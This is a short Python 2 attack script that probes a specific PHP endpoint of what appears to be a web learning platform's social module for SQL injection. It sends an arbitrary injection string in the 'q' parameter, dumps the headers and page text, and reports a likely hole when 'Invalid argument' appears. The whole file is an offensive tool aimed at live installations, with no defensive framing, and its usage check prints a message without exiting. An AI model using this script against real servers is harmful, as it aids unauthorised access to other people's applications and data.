import sys 
import re 
import requests 

from bs4 import BeautifulSoup 


def searchFriends_sqli(ip,inj_str): 
	target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip ,inj_str) 
	r = requests.get(target) 
	s = BeautifulSoup(r.text , 'lxml') 
	print "------------------ Headers ------------------ "
	print r.headers 
	print "---------------------END ------------------ "
	print " \n " 
	print "------------------ Content -------------------- "
	print s.text 
	print "---------------------END ------------------ "
	print " \n " 

	error = re.search("Invalid argument",s.text)
	if error:
		print "[+] Errors Found in response .Possible sql injection found"
	else: 
		print "[-] No errors found"
		
		
def main() : 
	if len(sys.argv) != 3:	
		print " usage : %s <target> <str_injection>"% sys.argv[0]
		
	ip = sys.argv[1]
	injection_string = sys.argv[2] 
	searchFriends_sqli(ip,injection_string) 



if __name__ == "__main__":
	main()
